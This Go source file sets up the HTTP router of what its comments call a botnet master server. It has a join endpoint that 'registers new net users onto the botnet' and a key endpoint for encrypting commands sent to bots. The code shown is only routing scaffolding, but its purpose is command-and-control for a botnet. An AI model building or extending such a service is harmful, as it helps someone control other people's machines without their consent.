package master

import (
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

// Config holds the service configuration
type Config struct {
	botMaster *Master
}

// NewMasterService returns an HTTP MUX with handler functions
func NewMasterService() *mux.Router {
	m, err := NewMaster()
	if err != nil {
		log.Fatalf("could not create new bot master: %s", err)
	}

	c := Config{botMaster: m}
	go c.botMaster.Start()

	router := mux.NewRouter()

	// the key endpoint exposes a public key to encrypt commands before sending
	router.Methods(http.MethodGet).Path(KeyEndpoint).HandlerFunc(c.keyHandler)
	// the join endpoint registers new net users onto the botnet
	router.Methods(http.MethodGet).Path(JoinEndpoint).HandlerFunc(c.joinHandler)

	return router
}
